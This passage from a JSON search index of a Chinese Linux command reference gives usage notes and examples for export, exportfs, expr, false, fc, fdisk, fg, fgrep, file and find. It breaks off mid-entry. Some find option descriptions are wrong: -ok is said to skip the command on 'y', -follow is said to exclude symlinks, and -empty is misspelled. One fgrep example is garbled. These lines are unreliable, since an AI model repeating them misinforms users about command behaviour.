**[参考链接2][2]** ）。\n\n#### Q：为什么我在查看变量或函数导出属性的时候显示的开头是`declare`？  \n\nA：因为`declare`也能够设置变量或函数的导出属性，详见`declare`命令。\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n### 知识点\n\n在`info bash`或 [bash在线文档](http://www.gnu.org/software/bash/manual/bash.html) 的\n `3.7.3`节提到了shell执行环境，其中涉及变量和函数的内容如下\n\n> - shell parameters that are set by variable assignment or with set or inherited from the shell’s parent in the environment\n> - shell functions defined during execution or inherited from the shell’s parent in the environment\n\n那么第一句话中的参数又和变量有什么关系呢？在`3.4`节第一段中提到：\n\n>  A variable is a parameter denoted by a name.\n\n变量是有名字的参数。\n\n那么子shell确实继承了父shell中带有导出属性的变量或函数。\n\n可参考链接： [执行脚本方式的区别](https://blog.csdn.net/soaringlee_fighting/article/details/78759448)\n\n\n### 参考链接\n\n1. [关于bashrc profile文件的讨论][1]\n2. [关于export数组的讨论][2]\n3. [export -pf用法][3]\n4. [环境变量和shell变量的区别][4]\n\n### 扩展阅读\n\n一般来说，配置交叉编译工具链的时候需要指定编译工具的路径，此时就需要设置环境变量。查看已经存在的环境变量：\n\n```shell\n[root@localhost ~]# export\ndeclare -x G_BROKEN_FILENAMES=\"1\"\ndeclare -x HISTSIZE=\"1000\"\ndeclare -x HOME=\"/root\"\ndeclare -x hostname=\"localhost\"\ndeclare -x INPUTRC=\"/etc/inputrc\"\ndeclare -x LANG=\"zh_CN.UTF-8\"\ndeclare -x LESSOPEN=\"|/usr/bin/lesspipe.sh %s\"\ndeclare -x logname=\"root\"\ndeclare -x LS_COLORS=\"no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:\"\ndeclare -x mail=\"/var/spool/mail/root\"\ndeclare -x OLDPWD\ndeclare -x PATH=\"/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin\"\ndeclare -x pwd=\"/root\"\ndeclare -x SHELL=\"/bin/bash\"\ndeclare -x SHLVL=\"1\"\ndeclare -x SSH_CLIENT=\"192.168.2.111 2705 22\"\ndeclare -x SSH_CONNECTION=\"192.168.2.111 2705 192.168.2.2 22\"\ndeclare -x SSH_TTY=\"/dev/pts/0\"\ndeclare -x TERM=\"linux\"\ndeclare -x USER=\"root\"\n```\n\n[1]: https://www.cnblogs.com/hongzg1982/articles/2101792.html\n[2]: https://stackoverflow.com/questions/5564418/exporting-an-array-in-bash-script\n[3]: https://unix.stackexchange.com/questions/22796/can-i-export-functions-in-bash\n[4]: https://askubuntu.com/questions/26318/environment-variable-vs-shell-variable-whats-the-difference\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","export"]},{"title":"【Linux 命令】exportfs","url":"/linux-command/exportfs/","content":"\n管理NFS共享文件系统列表\n\n## 补充说明\n\nexportfs 命令用来管理当前NFS共享的文件系统列表。\n\n参数：\n\n```shell\n-a 打开或取消所有目录共享。\n-o options,...指定一列共享选项，与 exports(5) 中讲到的类似。\n-i 忽略 /etc/exports 文件，从而只使用默认的和命令行指定的选项。\n-r 重新共享所有目录。它使 /var/lib/nfs/xtab 和 /etc/exports 同步。 它将 /etc/exports 中已删除的条目从 /var/lib/nfs/xtab 中删除，将内核共享表中任何不再有效的条目移除。\n-u 取消一个或多个目录的共享。\n-f 在“新”模式下，刷新内核共享表之外的任何东西。 任何活动的客户程序将在它们的下次请求中得到 mountd添加的新的共享条目。\n-v 输出详细信息。当共享或者取消共享时，显示在做什么。 显示当前共享列表的时候，同时显示共享的选项。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","exportfs"]},{"title":"【Linux 命令】expr","url":"/linux-command/expr/","content":"\n一款表达式计算工具\n\n## 补充说明\n\n**expr命令** 是一款表达式计算工具，使用它完成表达式的求值操作。\n\nexpr的常用运算符：\n\n- 加法运算：`+`\n- 减法运算：`-`\n- 乘法运算：`\\*`\n- 除法运算：`/`\n- 求摸（取余）运算：`%`\n\n###  语法\n\n```shell\nexpr(选项)(参数)\n```\n\n###  选项\n\n```shell\n--help：显示指令的帮助信息；\n--version：显示指令版本信息。\n```\n\n###  参数\n\n表达式：要求值的表达式。\n\n###  实例\n\n```shell\nresult=`expr 2 + 3`\nresult=$(expr $no1 + 5)\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","expr"]},{"title":"【Linux 命令】false","url":"/linux-command/false/","content":"\n返回状态为失败。\n\n## 概要\n\n```shell\nfalse\n```\n\n## 主要用途\n\n- 用于和其他命令进行逻辑运算。\n\n## 返回值\n\n返回状态总是失败；返回值为1。\n\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","false"]},{"title":"【Linux 命令】fc","url":"/linux-command/fc/","content":"\n显示历史列表中的命令或修改指定的历史命令并执行。\n\n## 概要\n\n```shell\nfc [-e ename] [-lnr] [first] [last]\nfc -s [pat=rep] [command]\n```\n\n## 主要用途\n\n- 显示历史列表中的命令。\n\n- 编辑并重新执行历史列表的命令。\n\n## 选项\n\n```shell\n-e ename                  选择使用的编辑器，默认调用次序为环境变量`FCEDIT`、环境变量`EDITOR`、`vi`。\n-l                        列出而不是编辑。\n-n                        列出时不输出行号（需配合-l选项）。\n-r                        倒序列出命令，最近执行的先列出（需配合-l选项）。\n-s [pat=rep] [command]    command（未指定时为最后执行的命令）将在pat替换为rep后重新执行。\n```\n\n## 参数\n\nfirst：可选；可以是字符串（以该字符串开头的最新命令）、数字（历史列表索引，负数代表当前命令号的偏移）；未指定时设置为前一个命令并且偏移量为-16（最近的16条命令）。\n\nlast：可选；可以是字符串（以该字符串开头的最新命令）、数字（历史列表索引，负数代表当前命令号的偏移）；未指定时设置为参数first。\n\n## 返回值\n\n返回成功或执行命令的状态，当错误出现时返回非0值。\n\n## 例子\n\n替换命令参数:\n\n```shell\n# 列出 ~ 目录\nls ~\n# 替换 ~ 为 / ，替换后列出根目录， \nfc -s ~=/\n```\n\n显示最近使用的10条历史命令：\n\n```shell\n[root@localhost ~]# fc -l -10\n1039     type -a grep\n1040     export\n1041     history 10\n1042     ulimit -a\n1043     shopt\n1044     help ls\n1045     help env\n1046     help short\n1047     help shopt\n1048     showkey -a\n```\n\n编辑第1040条历史命令：\n\n```shell\n[root@localhost ~]# fc 1040\n```\n\n\n### 注意\n\n1. 关闭终端后，历史列表将被写入历史文件`~/.bash_history`。\n2. 环境变量`FCEDIT`的值为`fc`默认的编辑器。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fc"]},{"title":"【Linux 命令】fdisk","url":"/linux-command/fdisk/","content":"\n查看磁盘使用情况和磁盘分区\n\n## 补充说明\n\n**fdisk命令** 用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面，而非类似DOS fdisk的cfdisk互动式操作界面，因此在使用上较为不便，但功能却丝毫不打折扣。\n\n###  语法 \n\n```shell\nfdisk(选项)(参数)\n```\n\n###  选项 \n\n```shell\n -b <大小>             扇区大小(512、1024、2048或4096)\n -c[=<模式>]           兼容模式：“dos”或“nondos”(默认)\n -h                    打印此帮助文本\n -u[=<单位>]           显示单位：“cylinders”(柱面)或“sectors”(扇区，默认)\n -v                    打印程序版本\n -C <数字>             指定柱面数\n -H <数字>             指定磁头数\n -S <数字>             指定每个磁道的扇区数\n```\n\n###  参数 \n\n设备文件：指定要进行分区或者显示分区的硬盘设备文件。\n\n###  实例 \n\n首先选择要进行操作的磁盘：\n\n```shell\n[root@localhost ~]# fdisk /dev/sdb\n```\n\n输入`m`列出可以执行的命令：\n\n```shell\ncommand (m for help): m\nCommand action\n   a   toggle a bootable flag\n   b   edit bsd disklabel\n   c   toggle the dos compatibility flag\n   d   delete a partition\n   l   list known partition types\n   m   print this menu\n   n   add a new partition\n   o   create a new empty DOS partition table\n   p   print the partition table\n   q   quit without saving changes\n   s   create a new empty Sun disklabel\n   t   change a partition's system id\n   u   change display/entry units\n   v   verify the partition table\n   w   write table to disk and exit\n   x   extra functionality (experts only)\n```\n\n输入`p`列出磁盘目前的分区情况：\n\n```shell\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1           1        8001   8e  Linux LVM\n/dev/sdb2               2          26      200812+  83  Linux\n```\n\n输入`d`然后选择分区，删除现有分区：\n\n```shell\nCommand (m for help): d\nPartition number (1-4): 1\n\nCommand (m for help): d\nSelected partition 2\n```\n\n查看分区情况，确认分区已经删除：\n\n```shell\nCommand (m for help): print\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n\nCommand (m for help):\n```\n\n输入`n`建立新的磁盘分区，首先建立两个主磁盘分区：\n\n```shell\nCommand (m for help): n\nCommand action\n   e   extended\n   p   primary partition (1-4)\np    //建立主分区\nPartition number (1-4): 1  //分区号\nFirst cylinder (1-391, default 1):  //分区起始位置\nUsing default value 1\nlast cylinder or +size or +sizeM or +sizeK (1-391, default 391): 100  //分区结束位置，单位为扇区\n\nCommand (m for help): n  //再建立一个分区\nCommand action\n   e   extended\n   p   primary partition (1-4)\np \nPartition number (1-4): 2  //分区号为2\nFirst cylinder (101-391, default 101):\nUsing default value 101\nLast cylinder or +size or +sizeM or +sizeK (101-391, default 391): +200M  //分区结束位置，单位为M\n```\n\n确认分区建立成功：\n\n```shell\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         100      803218+  83  Linux\n/dev/sdb2             101         125      200812+  83  Linux\n```\n\n再建立一个逻辑分区：\n\n```shell\nCommand (m for help): n\nCommand action\n   e   extended\n   p   primary partition (1-4)\ne  //选择扩展分区\nPartition number (1-4): 3\nFirst cylinder (126-391, default 126):\nUsing default value 126\nLast cylinder or +size or +sizeM or +sizeK (126-391, default 391):\nUsing default value 391\n```\n\n确认扩展分区建立成功：\n\n```shell\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         100      803218+  83  Linux\n/dev/sdb2             101         125      200812+  83  Linux\n/dev/sdb3             126         391     2136645    5  Extended\n```\n\n在扩展分区上建立两个逻辑分区：\n\n```shell\nCommand (m for help): n\nCommand action\n   l   logical (5 or over)\n   p   primary partition (1-4)\nl //选择逻辑分区\nFirst cylinder (126-391, default 126):\nUsing default value 126\nLast cylinder or +size or +sizeM or +sizeK (126-391, default 391): +400M    \n\nCommand (m for help): n\nCommand action\n   l   logical (5 or over)\n   p   primary partition (1-4)\nl\nFirst cylinder (176-391, default 176):\nUsing default value 176\nLast cylinder or +size or +sizeM or +sizeK (176-391, default 391):\nUsing default value 391\n```\n\n确认逻辑分区建立成功：\n\n```shell\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         100      803218+  83  Linux\n/dev/sdb2             101         125      200812+  83  Linux\n/dev/sdb3             126         391     2136645    5  Extended\n/dev/sdb5             126         175      401593+  83  Linux\n/dev/sdb6             176         391     1734988+  83  Linux\n\nCommand (m for help):\n```\n\n从上面的结果我们可以看到，在硬盘sdb我们建立了2个主分区（sdb1，sdb2），1个扩展分区（sdb3），2个逻辑分区（sdb5，sdb6）\n\n注意：主分区和扩展分区的磁盘号位1-4，也就是说最多有4个主分区或者扩展分区，逻辑分区开始的磁盘号为5，因此在这个实验中试没有sdb4的。\n\n最后对分区操作进行保存：\n\n```shell\nCommand (m for help): w\nThe partition table has been altered!\n\nCalling ioctl() to re-read partition table.\nSyncing disks.\n```\n\n建立好分区之后我们还需要对分区进行格式化才能在系统中使用磁盘。\n\n在sdb1上建立ext2分区：\n\n```shell\n[root@localhost ~]# mkfs.ext2 /dev/sdb1\nmke2fs 1.39 (29-May-2006)\nFilesystem label=\nOS type: Linux\nBlock size=4096 (log=2)\nFragment size=4096 (log=2)\n100576 inodes, 200804 blocks\n10040 blocks (5.00%) reserved for the super user\nFirst data block=0\nMaximum filesystem blocks=209715200\n7 block groups\n32768 blocks per group, 32768 fragments per group\n14368 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840\n\nWriting inode tables: done                           \nWriting superblocks and filesystem accounting information: done\n\nThis filesystem will be automatically checked every 32 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n```\n\n在sdb6上建立ext3分区：\n\n```shell\n[root@localhost ~]# mkfs.ext3 /dev/sdb6\nmke2fs 1.39 (29-May-2006)\nFilesystem label=\nOS type: Linux\nBlock size=4096 (log=2)\nFragment size=4096 (log=2)\n217280 inodes, 433747 blocks\n21687 blocks (5.00%) reserved for the super user\nFirst data block=0\nMaximum filesystem blocks=444596224\n14 block groups\n32768 blocks per group, 32768 fragments per group\n15520 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912\n\nWriting inode tables: done                           \nCreating journal (8192 blocks): done\nWriting superblocks and filesystem accounting information: done\n\nThis filesystem will be automatically checked every 32 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n[root@localhost ~]#\n```\n\n建立两个目录`/oracle`和`/web`，将新建好的两个分区挂载到系统：\n\n```shell\n[root@localhost ~]# mkdir /oracle\n[root@localhost ~]# mkdir /web\n[root@localhost ~]# mount /dev/sdb1 /oracle\n[root@localhost ~]# mount /dev/sdb6 /web\n```\n\n查看分区挂载情况：\n\n```shell\n[root@localhost ~]# df -h\n文件系统              容量  已用 可用 已用% 挂载点\n/dev/mapper/VolGroup00-LogVol00\n                      6.7G  2.8G  3.6G  44% /\n/dev/sda1              99M   12M   82M  13% /boot\ntmpfs                 125M     0  125M   0% /dev/shm\n/dev/sdb1             773M  808K  733M   1% /oracle\n/dev/sdb6             1.7G   35M  1.6G   3% /web\n```\n\n如果需要每次开机自动挂载则需要修改`/etc/fstab`文件，加入两行配置：\n\n```shell\n[root@localhost ~]# vim /etc/fstab\n\n/dev/VolGroup00/LogVol00 /                       ext3    defaults        1 1\nLABEL=/boot             /boot                   ext3    defaults        1 2\ntmpfs                   /dev/shm                tmpfs   defaults        0 0\ndevpts                  /dev/pts                devpts  gid=5,mode=620  0 0\nsysfs                   /sys                    sysfs   defaults        0 0\nproc                    /proc                   proc    defaults        0 0\n/dev/VolGroup00/LogVol01 swap                    swap    defaults        0 0\n/dev/sdb1               /oracle                 ext2    defaults        0 0\n/dev/sdb6               /web                    ext3    defaults        0 0\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fdisk"]},{"title":"【Linux 命令】fg","url":"/linux-command/fg/","content":"\n将后台作业移动到前台终端运行\n\n## 概要\n\n```shell\nfg [job_spec ...]\n```\n\n## 主要用途\n\n- 用于将后台作业（在后台运行的或者在后台挂起的作业）放到前台终端运行。\n\n- 若后台任务中只有一个，则使用该命令时可以省略任务号。\n\n## 参数\n\njob_spec（可选）：指定要移动到前台执行的作业标识符，可以是一到多个。\n\n## 返回值\n\n返回作业的执行状态，如果发生了错误返回失败。\n\n## 例子\n\n```shell\n# 运行sleep命令，然后按下ctrl+z。\nsleep 60\n^Z\n[1]+  Stopped                 sleep 60\n\n# 使用fg命令使得作业在前台运行。\nfg %1\n\n# 返回信息：\nsleep 60\n```\n\n### 注意\n\n1. `bash`的作业控制命令包括`bg fg kill wait disown suspend`。\n2. 该命令需要`set`选项`monitor`处于开启状态时才能执行；查看作业控制状态：输入`set -o`查看`monitor`行；执行`set -o monitor`或`set -m`开启该选项。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fg"]},{"title":"【Linux 命令】fgrep","url":"/linux-command/fgrep/","content":"\n为文件搜索文字字符串\n\n## 补充说明\n\n**fgrep命令** 是用来搜索 file 参数指定的输入文件（缺省为标准输入）中的匹配模式的行。fgrep 命令特别搜索 Pattern 参数，它们是固定的字符串。如果在 File 参数中指定一个以上的文件 fgrep 命令将显示包含匹配行的文件。\n\nfgrep 命令于 grep 和 egrep 命令不同，因为它搜索字符串而不是搜索匹配表达式的模式。fgrep 命令使用快速的压缩算法。`$, *, &#91;, |, (, )`和`\\`等字符串被 fgrep 命令按字面意思解释。这些字符并不解释为正则表达式，但它们在 grep 和 egrep 命令中解释为正则表达式。因为这些字符对于 shell 有特定的含义，完整的字符串应该加上单引号`‘ ... ’`。. 如果没有指定文件， fgrep 命令假定标准输入。一般，找到的每行都复制到标准输出中去。如果不止一个输入文件，则在找到的每行前打印文件名。\n\n1.  fgrep 命令和带 -F 标志的 grep命令是一样的但出错和用法消息不同-s 标志功能也不同。\n2.  每行限制在 2048 个字节。\n3.  段落（-p 标志下）目前限制在5000个字符的长度。\n4.  不要在特定的文件中运行 grep 命令，因为会产生不可预料的结果。\n5.  输入行不能包含空字符。\n6.  输入文件应该以换行字符结尾。\n7.  虽然可以同时指定很多标志，但某些标志会覆盖其余的标志。例如，如果同时指定 -l 和 -n ，只有文件名写入到标准输出中去。\n\n###  语法\n\n```shell\nfgrep(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b：在找到的每行之前添加行所在的块编号。使用此标志有助于按照上下文查找磁盘块号码。-b 标志不能用于标准输入或者管道输入。\n-c：仅显示匹配行的计数。\n-e 模式：指定模式。这个工作模式很简单，但当此模式以 a-(减号) 开头时却是很有用的。\n-f StringFile：指定包含字符串的文件。\n-h：当多个文件被处理时隐藏文件名。\n-i：当进行比较时忽略字母的大小写。\n-l：只列出包含匹配行的文件名（一次）。文件名之间用换行符分隔。\nn：将文件中每行的相对行号置于行前。\n-pSeparator：显示包含匹配行的整个段落。段落之间将按照Separator参数指定的段落分隔符加以分隔，这些分隔符是与搜索模式有着相同格式的模式。包含段落分隔符的行将仅用作分隔符；它们不会被包含在输出中。缺省的段落分隔符是空白行。\n-q：禁止所有写入到标准输出的操作，不管是否为匹配行。如果选中输入行，以 0 状态退出。\n-s：仅显示出错消息。这在检查状态时很有用。\n-v：显示除了匹配特定模式的行以外的所有行。\n-w：执行单词搜索。\n-x：显示匹配模式的行，要求无额外的字符。\n-y：当进行比较时忽略字符的大小写。\n```\n\n此命令返回以下出口值：\n\n```shell\n0    找到匹配项。\n1    未找到匹配项。\n>1   发现语法错误，或者文件不可访问（即使找到了匹配项）。\n```\n\n###  实例\n\n **搜索几个文件中的一个简单字符串：** \n\n```shell\nfgrep strcpy *.c\n```\n\n在当前目录下所有以 .c 字符串结尾的文件中搜索字符串 strcpy。\n\n **计数匹配某模式的行数：** \n\n```shell\nfgrep -c 『{』pgm.cfgrep -c 『}』pgm.c\n```\n\n显示在 pgm.c 中包含左括号和右括号的行的数目。\n\n如果在您的 C 程序中一行中没有包含多于一个 { (左括号) 或者 } (右括号)，并且括号正确匹配，那么这两个数字将是一样的。如果这两个数字不一样，您可以将包含括号的行按照他们在文件中的位置顺序显示出来，使用以下命令：\n\n```shell\negrep {\\|} pgm.c\n```\n\n **显示包含某模式的文件名：** \n\n```shell\nfgrep -l strcpy *.c\n```\n\n搜索当前目录下以 .c 结尾的文件，然后显示包含 strcpy 字符串的文件名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fgrep"]},{"title":"【Linux 命令】file","url":"/linux-command/file/","content":"\n用来探测给定文件的类型\n\n## 补充说明\n\n**file命令** 用来探测给定文件的类型。file命令对文件的检查分为文件系统、魔法幻数检查和语言检查3个过程。\n\n###  语法\n\n```shell\nfile(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b：列出辨识结果时，不显示文件名称；\n-c：详细显示指令执行过程，便于排错或分析程序执行的情形；\n-f<名称文件>：指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称；\n-L：直接显示符号连接所指向的文件类别；\n-m<魔法数字文件>：指定魔法数字文件；\n-v：显示版本信息；\n-z：尝试去解读压缩文件的内容。\n```\n\n###  参数\n\n文件：要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。\n\n###  实例\n\n显示文件类型\n\n```shell\n[root@localhost ~]# file install.log\ninstall.log: UTF-8 Unicode text\n\n[root@localhost ~]# file -b install.log      <== 不显示文件名称\nUTF-8 Unicode text\n\n[root@localhost ~]# file -i install.log      <== 显示MIME类别。\ninstall.log: text/plain; charset=utf-8\n\n[root@localhost ~]# file -b -i install.log\ntext/plain; charset=utf-8\n```\n\n显示符号链接的文件类型\n\n```shell\n[root@localhost ~]# ls -l /var/mail\nlrwxrwxrwx 1 root root 10 08-13 00:11 /var/mail -> spool/mail\n\n[root@localhost ~]# file /var/mail\n/var/mail: symbolic link to `spool/mail'\n\n[root@localhost ~]# file -L /var/mail\n/var/mail: directory\n\n[root@localhost ~]# file /var/spool/mail\n/var/spool/mail: directory\n\n[root@localhost ~]# file -L /var/spool/mail\n/var/spool/mail: directory\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","file"]},{"title":"【Linux 命令】find","url":"/linux-command/find/","content":"\n在指定目录下查找文件\n\n## 补充说明\n\n**find命令** 用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。\n\n### 语法\n\n```shell\nfind(选项)(参数)\n```\n\n### 选项\n\n```shell\n-amin<分钟>：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；\n-anewer<参考文件或目录>：查找其存取时间较指定文件或目录的存取时间更接近现在的文件或目录；\n-atime<24小时数>：查找在指定时间曾被存取过的文件或目录，单位以24小时计算；\n-cmin<分钟>：查找在指定时间之时被更改过的文件或目录；\n-cnewer<参考文件或目录>查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；\n-ctime<24小时数>：查找在指定时间之时被更改的文件或目录，单位以24小时计算；\n-daystart：从本日开始计算时间；\n-depth：从指定目录下最深层的子目录开始查找；\n-expty：寻找文件大小为0 Byte的文件，或目录下没有任何子目录或文件的空目录；\n-exec<执行指令>：假设find指令的回传值为True，就执行该指令；\n-false：将find指令的回传值皆设为False；\n-fls<列表文件>：此参数的效果和指定“-ls”参数类似，但会把结果保存为指定的列表文件；\n-follow：排除符号连接；\n-fprint<列表文件>：此参数的效果和指定“-print”参数类似，但会把结果保存成指定的列表文件；\n-fprint0<列表文件>：此参数的效果和指定“-print0”参数类似，但会把结果保存成指定的列表文件；\n-fprintf<列表文件><输出格式>：此参数的效果和指定“-printf”参数类似，但会把结果保存成指定的列表文件；\n-fstype<文件系统类型>：只寻找该文件系统类型下的文件或目录；\n-gid<群组识别码>：查找符合指定之群组识别码的文件或目录；\n-group<群组名称>：查找符合指定之群组名称的文件或目录；\n-help或--help：在线帮助；\n-ilname<范本样式>：此参数的效果和指定“-lname”参数类似，但忽略字符大小写的差别；\n-iname<范本样式>：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；\n-inum<inode编号>：查找符合指定的inode编号的文件或目录；\n-ipath<范本样式>：此参数的效果和指定“-path”参数类似，但忽略字符大小写的差别；\n-iregex<范本样式>：此参数的效果和指定“-regexe”参数类似，但忽略字符大小写的差别；\n-links<连接数目>：查找符合指定的硬连接数目的文件或目录；\n-lname<范本样式>：指定字符串作为寻找符号连接的范本样式；\n-ls：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出；\n-maxdepth<目录层级>：设置最大目录层级；\n-mindepth<目录层级>：设置最小目录层级；\n-mmin<分钟>：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；\n-mount：此参数的效果和指定“-xdev”相同；\n-mtime<24小时数>：查找在指定时间曾被更改过的文件或目录，单位以24小时计算；\n-name<范本样式>：指定字符串作为寻找文件或目录的范本样式；\n-newer<参考文件或目录>：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；\n-nogroup：找出不属于本地主机群组识别码的文件或目录；\n-noleaf：不去考虑目录至少需拥有两个硬连接存在；\n-nouser：找出不属于本地主机用户识别码的文件或目录；\n-ok<执行指令>：此参数的效果和指定“-exec”类似，但在执行指令之前会先询问用户，若回答“y”或“Y”，则放弃执行命令；\n-path<范本样式>：指定字符串作为寻找目录的范本样式；\n-perm<权限数值>：查找符合指定的权限数值的文件或目录；\n-print：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；\n-print0：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为全部的名称皆在同一行；\n-printf<输出格式>：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式可以自行指定；\n-prune：不寻找字符串作为寻找文件或目录的范本样式;\n-regex<范本样式>：指定字符串作为寻找文件或目录的范本样式；\n-size<文件大小>：查找符合指定的文件大小的文件；\n-true：将find指令的回传值皆设为True；\n-type<文件类型>：只寻找符合指定的文件类型的文件；\n-uid<用户识别码>：查找符合指定的用户识别码的文件或目录；\n-used<日数>：查找文件或目录被更改之后在指定时间曾被存取过的文件或目录，单位以日计算；\n-user<拥有者名称>：查找符和指定的拥有者名称的文件或目录；\n-version或——version：显示版本信息；\n-xdev：将范围局限在先行的文件系统中；\n-xtype<文件类型>：此参数的效果和指定“-type”参数类似，差别在于它针对符号连接检查。\n```\n\n### 参数\n\n起始目录：查找文件的起始目录。\n\n### 实例\n\n```shell\n# 当前目录搜索所有文件，文件内容 包含 “140.206.111.111” 的内容\nfind . -type f -name \"*\" | xargs grep \"140.206.111.111\"\n```\n\n#### 根据文件或者正则表达式进行匹配\n\n列出当前目录及子目录下所有文件和文件夹\n\n```shell\nfind .\n```\n\n在`/home`目录下查找以.txt结尾的文件名\n\n```shell\nfind /home -name \"*.txt\"\n```\n\n同上，但忽略大小写\n\n```shell\nfind /home -iname \"*.txt\"\n```\n\n当前目录及子目录下查找所有以.txt和.pdf结尾的文件\n\n```shell\nfind . \\( -name \"*.txt\" -o -name \"*.pdf\" \\)\n\n或\n\nfind . -name \"*.txt\" -o -name \"*.pdf\"\n```\n\n匹配文件路径或者文件\n\n```shell\nfind /usr/ -path \"*local*\"\n```\n\n基于正则表达式匹配文件路径\n\n```shell\nfind . -regex \".*\\(\\.txt\\|\\.pdf\\)$\"\n```\n\n同上，但忽略大小写\n\n```shell\nfind . -iregex \".*\\(\\.txt\\|\\.pdf\\)$\"\n```\n\n#### 否定参数\n\n找出/home下不是以.txt结尾的文件\n\n```shell\nfind /home ! -name \"*.txt\"\n```\n\n#### 根据文件类型进行搜索\n\n```shell\nfind . -type 类型参数\n```\n\n类型参数列表：\n\n*    **f**  普通文件\n*    **l**  符号连接\n*    **d**  目录\n*    **c**  字符设备\n*    **b**  块设备\n*    **s**  套接字\n*    **p**  Fifo\n\n#### 基于目录深度搜索\n\n向下最大深度限制为3\n\n```shell\nfind . -maxdepth 3 -type f\n```\n\n搜索出深度距离当前目录至少2个子目录的所有文件\n\n```shell\nfind . -mindepth 2 -type f\n```\n\n#### 根据文件时间戳进行搜索\n\n```shell\nfind . -type f 时间戳\n```\n\nUNIX/Linux文件系统每个文件都有三种时间戳：\n\n*    **访问时间** （-atime/天，-amin/分钟）：用户最近一次访问时间。\n*    **修改时间** （-mtime/天，-mmin/分钟）：文件最后一次修改时间。\n*    **变化时间** （-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。\n\n搜索最近七天内被访问过的所有文件\n\n```shell\nfind . -type f -atime -7\n```\n\n搜索恰好在七天前被访问过的所有文件\n\n```shell\nfind . -type f -atime 7\n```\n\n搜索超过七天内被访问过的所有文件\n\n```shell\nfind . -type f -atime +7\n```\n\n搜索访问时间超过10分钟的所有文件\n\n```shell\nfind . -type f -amin +10\n```\n\n找出比file.log修改时间更长的所有文件\n\n```shell\nfind . -type f -newer file.log\n```\n\n#### 根据文件大小进行匹配\n\n```shell\nfind . -type f -size 文件大小单元\n```\n\n文件大小单元：\n\n*    **b**  —— 块（512字节）\n*    **c**  —— 字节\n*    **w**  —— 字（2字节）\n*    **k**  —— 千字节\n*    **M**  —— 兆字节\n*    **G**  —— 吉字节\n\n搜索大于10KB的文件\n\n```shell\nfind . -type f -size +10k\n```\n\n搜索小于10KB的文件\n\n```shell\nfind . -type f -size 